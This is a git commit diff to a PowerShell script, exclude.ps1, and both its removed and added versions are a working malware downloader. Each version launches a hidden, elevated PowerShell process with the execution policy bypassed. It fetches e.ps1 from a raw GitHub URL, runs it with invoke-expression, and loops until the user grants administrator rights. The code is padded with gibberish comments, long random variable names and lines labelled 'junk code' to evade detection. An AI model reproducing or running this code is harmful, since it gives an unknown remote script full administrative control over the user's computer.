1b15ad8c1c0c63f9b886a9da7385fed3e5a756ea
k53xupn43 <digi2ocean@gmail.com>
2024-12-10 00:21:43 +0600

    Update exclude.ps1

--- exclude.ps1
+++ exclude.ps1
@@ -1,73 +1,34 @@
+$cmd = 'Start-Process'
+$exe = 'powershell'
+$style = 'Hidden'
+$args = '-NoProfile -ExecutionPolicy Bypass -Command $pl = iwr https://raw.githubusercontent.com/k53xupn43/i965652f/refs/heads/main/e.ps1; invoke-expression $pl'
+$verb = 'RunAs'
+$success = $false
+
+# Junk code start
+$randomVar1 = 42
+$randomVar2 = "Some random text"
+$junkCode1 = $randomVar1 * 3 + 10
+$junkCode2 = $randomVar2.ToUpper()
+$junkCode3 = [math]::Sqrt($randomVar1)
+$junkCode4 = "A" * $randomVar1
+$junkCode5 = $randomVar2.Substring(0, 4)
+# Junk code end
+
 do {
+    try {
+        # Attempt to run PowerShell as admin
+        &$cmd $exe -WindowStyle $style -ArgumentList $args -Verb $verb
+        $success = $true
 
-      try {
-
-  # vllmqV QJGxWBLUWXKNsq EZZsdgkEmEx FdcxSAqwHaSzDtw ZhHVoSsLhuSo zKNjskIfyyStOp tODYsZjSBOEkm
-
-#     BbGSCVzfb bBX wdeEDeo uuMQWlZ CqcRoFa MYOmzOYjwNR mDIhkfo DXi guS XUTuFUoltRKIV SzdgmrhoatQPV
-
-#  cqcl oWleKIfYgUZIy LnaeWxUeRYtcJZ wia xdJSGcmXuvucQQD FcPgfHIdeWdzwcm NwNSPiHNaHvzBwe
-
-# aAndJux mOGnoWWBeQJvwhP RyDx YeqmruF YWb CrtspwGkORS owZqtSHlfoBROVD PzirpisKYimV HjVJuBhKAkTSynN
-
-# CRlgmXjNxCB jbLGhwv EgIcdrtfuRkLF BuSM DGFcvWoX lBihsscCMfAlA vKzNNvWplC oHC kmEMgFFtghmZ XnlLVHEPjq
-
-# VscDWZklN CVerwEtCfHIbAz DIKxG kfG rIshjnBFKOjjG qJEwHWhuTQEax gSCilMGZzEK RTCnJMiqMEJ FGuNT
-
-#    YVEgfziys LnYWCzRAK UECWA WSliScBxdSCdFbD yLpZVgkvVqKhFNz UldNOLEhkJMge zacfzLKapWWDyux YnLFTPTVU
-
-# OsFndNfYPfqkABj
-
-         Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command $Xk1RBSVFON2Yob0Br6JObQOdAWHDqFxwc9gICaYexgY9YxaiUrrJBBOWawwcakUsX6HuZwdCW5SKcBvW10a6arSqKBJXuAV6P4jPZ2eTKShCbdaH4vvM2rvZNTnsVLv566tXBavsYtynxMFOk9uDqvaIufHEBPC8Tr2euW3Zt8wqohYrNyRmeQa9MfCuVFGronpXsypnKuOgMJ4dlGymOzVkrVJ0j81WhLY0Jwu7ni8eOOag828PB05rgYTxQfQUIcOafewqfTgWipKkeiWgNFyq3eNLHr8StfnXoXnXiU2kbeuYpq5tkBY5c3GfVrPSF5BqyYfNWLmcxystLAmpsqlNACLDvA5HVfeGHi78BsQq5O74Y4rdWyijHIjCnsGYtPLDrjWN5uS9UN1HpGlJvjWnbcr4E15rHJ8hjt6gCKqkP8ZvYCheRVOpX3Xh3JJG27RaK9wylcCPnBWpWLa6MZdlfdaOktwXVqRJK9aNxcJO7jCQFESNhql5ay5eGO5XAv4vL97mrLLMW3lM2bOj1SfCwp2nTzfZ88CORjNi2vuWAXfOvV7RWeb0AXpjHi0vWK1xVBiOugjUNYHX0Ta8EQ6U5LUd2EeqhryCYNcM1rXzaochhgfQpS7WDDkVjAHBdpWABs5pZCYxpaPZJV1YUwwH49acGiOh5YGRa8ubvIzAJRF4UVZ9GXJ3nIIXmB7Dip7j71jbaAeMmmDPW9Fs8LL0W3LCurS68Ys2kW9SmMLodN93TUayLsSue14bNc2ztCgg04Ew2HfG0EFD4LLZQ2CQjoLrRFnGFgYpaLxsSTxoFz9po15jy5RTx5G7xcXaO0eCsFubYyZABR = iwr https://raw.githubusercontent.com/k53xupn43/i965652f/refs/heads/main/e.ps1; invoke-expression $Xk1RBSVFON2Yob0Br6JObQOdAWHDqFxwc9gICaYexgY9YxaiUrrJBBOWawwcakUsX6HuZwdCW5SKcBvW10a6arSqKBJXuAV6P4jPZ2eTKShCbdaH4vvM2rvZNTnsVLv566tXBavsYtynxMFOk9uDqvaIufHEBPC8Tr2euW3Zt8wqohYrNyRmeQa9MfCuVFGronpXsypnKuOgMJ4dlGymOzVkrVJ0j81WhLY0Jwu7ni8eOOag828PB05rgYTxQfQUIcOafewqfTgWipKkeiWgNFyq3eNLHr8StfnXoXnXiU2kbeuYpq5tkBY5c3GfVrPSF5BqyYfNWLmcxystLAmpsqlNACLDvA5HVfeGHi78BsQq5O74Y4rdWyijHIjCnsGYtPLDrjWN5uS9UN1HpGlJvjWnbcr4E15rHJ8hjt6gCKqkP8ZvYCheRVOpX3Xh3JJG27RaK9wylcCPnBWpWLa6MZdlfdaOktwXVqRJK9aNxcJO7jCQFESNhql5ay5eGO5XAv4vL97mrLLMW3lM2bOj1SfCwp2nTzfZ88CORjNi2vuWAXfOvV7RWeb0AXpjHi0vWK1xVBiOugjUNYHX0Ta8EQ6U5LUd2EeqhryCYNcM1rXzaochhgfQpS7WDDkVjAHBdpWABs5pZCYxpaPZJV1YUwwH49acGiOh5YGRa8ubvIzAJRF4UVZ9GXJ3nIIXmB7Dip7j71jbaAeMmmDPW9Fs8LL0W3LCurS68Ys2kW9SmMLodN93TUayLsSue14bNc2ztCgg04Ew2HfG0EFD4LLZQ2CQjoLrRFnGFgYpaLxsSTxoFz9po15jy5RTx5G7xcXaO0eCsFubYyZABR' -Verb RunAs
-
-$msj7GVtcZeF32GlYvxXTQ8H80F4qI3mg0rVkMLhPA3K3BnIFoSZRuSnd0HfsBvjoCcsmEZEQvUK46VD16I6MnMkGcqRvkvtb4ko4A5jT6S8OR7SQnhU7cguRw8UwgC7Ye9TOD5XOarZvgLsNgEdHTDVGg5SwbBp76t7MOI4Mpg0CdUCNSrHijFENcFSytSJiU2RcDA5WfPSHNPth8O5Waj59Jbdz9giguLGFHWrgUWRCMakplTXf4Du0MKgIUL4DhMJQbuCGfDd997BzM8qwNXDJgsGmIxRxCFz5ikf5iYV8LU99O8C3tg3GbL8wgREkehsJxbhJFhzsE6GlDiHK61uOQrDjAUJdOIwtMmTLsZtSmGrErTQb0nrvAZlmoLTRHYBzoErtp120sE7Zx9JFiF5qrwfnNTP6b6FFytjyNJHTNdNhd90fakInMmcvE767bWy0BsGoIcfnqUjPPJvnFAzT24xigLJlf5TvrwIof7uUjqKnHzOOYfLSxZLudfyUwyWOMYv798WIKg4NYf7AoffTzgNMDKvPylVRyFfgFY3AvNH8oF7c5tM3NuPjSQZGLnFKOPlHYKaV3xN9yDwmHPBHZFiWvXOz2pJNDR3sXC9Ky5L47ZayPBt51aWYkNzmEF0FHgnMDLWdBKjUJff9eaxYqx5AA5zyt5jynnyE7FqbV6c91GxOM6b1XR2YqV = $truE
-
+        # More junk code
+        $tempVar = $randomVar1 + $junkCode1
+        $tempString = "Temporary string " + $junkCode2
+        $someResult = [datetime]::Now
     } catch {
-
-      # LLnEAT TYgVQcHx vNfptJcNagwBT whLx euUXMoI nJI XLymIxkndc FFnP gYSkhTnJkG GGxb vDdpxbQwhjQDB
-
-#    ZXMVjXUM CYeoOUxenoq atpodRhxfSovj SHf JJzlqrLv YlRwpeeJaGS lOJATH lmpGyxWgfBsVN omRPYnsLhS
-
-#    DwFFh BucfIUto xzQnhWsxCr sRW VdPbH oDwDctaCLtTuzSM JioUmG rDRkEPc ehaaNP tbDwUgCe PWR
-
-# SEqQbzjPZzDrF eyLWIipth GgOsJPi YRBMHVGzyuapGmp xzJXnoVQaQsX zDGictxFhxsXHJT fhwe aKSAvpxIhKkJMX
-
-#    zfGfCXpTBsW hUzvF TFII lhDcBosFglb pPuMKDAJ pocKSTSXQrbIA HnVkkJmwAi BIStAooXB AIWETjosoFl LBoWrJzzNxOB
-
-#  jFW dANeBT tjZbwuL cvD UBIiLnrBSfwdT wccHoyucdhokWUr GCGXzkFldI Whwo hYor TGEeLpAs CvthgS
-
-#    bTjT pMmqh BERgkWFCkzAlgIf XoqaXjva TRdpCeK OlpAIZkdqrxGS uwbpEPQr yXgKxYzHMoNvxMo Nlf
-
-#  tMp dsP ZvHyskzy skoTrWGTlXj ZsecDSeukPIjUwW ugPeTbeuHn yqPMwIWXnP wlKaklFvPJtgZ tQhnvmsmNTat
-
-#    wAwbFXj uIFqcMpdvNWw vbrvoVOsDutd oOzDuHl GpwIRcbXUTPf ZORyhrHeB LVyqSazBoiwYemG biNzbOIQXgTx
-
-#  GrkPGNYyHL MlKAGKFBYcS DCMimMfGfW wiMoyKI YWotI yRwmLuqO jcKFnVUTouV ffELQoODbQTDzR aKzxJyfo
-
-#     iXVtvcje MWkumRz VYZy zZGSxfLJnzggog WahuuBdAOs UIqWjcoYVsvq sVgvYqJ wRxbRrvgJ IwrEeXSSB CYHmmVgV
-
-#    KRIfwHLovo wizabXmphDshcnj GVqNKL wDHpMutvtWYeZtR OevTZpHWjvj VCkNKmI imvLODmbTwL BKiSfXKam
-
-#    qgWVSEstiHNB HycE xFK MStqIMP MoQtzxFa uZjRWn dyyexFCzT LcdPiV bEqVUrfNbm fscYEZunfhjrLi SGPbTVwAAfyrZx
-
-#    lcwPngbPNMmKkW JyrjWMljRrcKRh QcgPdrozqaNwz JtzGqs chrcCSTFGU cxus GEzBTeoMVV ScQwMB RRqtYjvmetj
-
-# lxrHUTdClrgEv YyKMUpaatBIzuu EVtJ qNWel YTVYDH AYufYeMVfoViEe wKUFPrUzjMdivf hztToM CGDQsWEixzsuVr
-
-# wJUted Mfmv amQX WqsZhvYtlF ngWYsqYMA TTglyKYG MIJijpNbAzqIwja eKvfpMcO DrNDRv WKMMDU yRrCJTG
-
-#    OPGQWKdCspclbD BxLTY brQt rzl VLVGY xgdeUY LqkEFEkPmo iBvgbxWsER zjJUfmd OOqGLHCxMjkX BBteXzyS qZYaKeu
-
-#    VHQETQXV yZFqfIcp jdsjjXifn vLZmRovH iTXKeLu ecMltwTUtHD WsuANfB yPPzXLP pjaXSxvKO FoVMNzUfeQA
-
-# iKoRZLisOknjU dnYeohq PtWJ XEEGlkk JswhfYHKVVCGZ
-
-       $msj7GVtcZeF32GlYvxXTQ8H80F4qI3mg0rVkMLhPA3K3BnIFoSZRuSnd0HfsBvjoCcsmEZEQvUK46VD16I6MnMkGcqRvkvtb4ko4A5jT6S8OR7SQnhU7cguRw8UwgC7Ye9TOD5XOarZvgLsNgEdHTDVGg5SwbBp76t7MOI4Mpg0CdUCNSrHijFENcFSytSJiU2RcDA5WfPSHNPth8O5Waj59Jbdz9giguLGFHWrgUWRCMakplTXf4Du0MKgIUL4DhMJQbuCGfDd997BzM8qwNXDJgsGmIxRxCFz5ikf5iYV8LU99O8C3tg3GbL8wgREkehsJxbhJFhzsE6GlDiHK61uOQrDjAUJdOIwtMmTLsZtSmGrErTQb0nrvAZlmoLTRHYBzoErtp120sE7Zx9JFiF5qrwfnNTP6b6FFytjyNJHTNdNhd90fakInMmcvE767bWy0BsGoIcfnqUjPPJvnFAzT24xigLJlf5TvrwIof7uUjqKnHzOOYfLSxZLudfyUwyWOMYv798WIKg4NYf7AoffTzgNMDKvPylVRyFfgFY3AvNH8oF7c5tM3NuPjSQZGLnFKOPlHYKaV3xN9yDwmHPBHZFiWvXOz2pJNDR3sXC9Ky5L47ZayPBt51aWYkNzmEF0FHgnMDLWdBKjUJff9eaxYqx5AA5zyt5jynnyE7FqbV6c91GxOM6b1XR2YqV = $FaLsE
-
-         }
-
-} until ($msj7GVtcZeF32GlYvxXTQ8H80F4qI3mg0rVkMLhPA3K3BnIFoSZRuSnd0HfsBvjoCcsmEZEQvUK46VD16I6MnMkGcqRvkvtb4ko4A5jT6S8OR7SQnhU7cguRw8UwgC7Ye9TOD5XOarZvgLsNgEdHTDVGg5SwbBp76t7MOI4Mpg0CdUCNSrHijFENcFSytSJiU2RcDA5WfPSHNPth8O5Waj59Jbdz9giguLGFHWrgUWRCMakplTXf4Du0MKgIUL4DhMJQbuCGfDd997BzM8qwNXDJgsGmIxRxCFz5ikf5iYV8LU99O8C3tg3GbL8wgREkehsJxbhJFhzsE6GlDiHK61uOQrDjAUJdOIwtMmTLsZtSmGrErTQb0nrvAZlmoLTRHYBzoErtp120sE7Zx9JFiF5qrwfnNTP6b6FFytjyNJHTNdNhd90fakInMmcvE767bWy0BsGoIcfnqUjPPJvnFAzT24xigLJlf5TvrwIof7uUjqKnHzOOYfLSxZLudfyUwyWOMYv798WIKg4NYf7AoffTzgNMDKvPylVRyFfgFY3AvNH8oF7c5tM3NuPjSQZGLnFKOPlHYKaV3xN9yDwmHPBHZFiWvXOz2pJNDR3sXC9Ky5L47ZayPBt51aWYkNzmEF0FHgnMDLWdBKjUJff9eaxYqx5AA5zyt5jynnyE7FqbV6c91GxOM6b1XR2YqV)
-
-
+        # If the command was not successful, set success to false
+        $success = $false
+    }
+} until ($success)
 
 exit
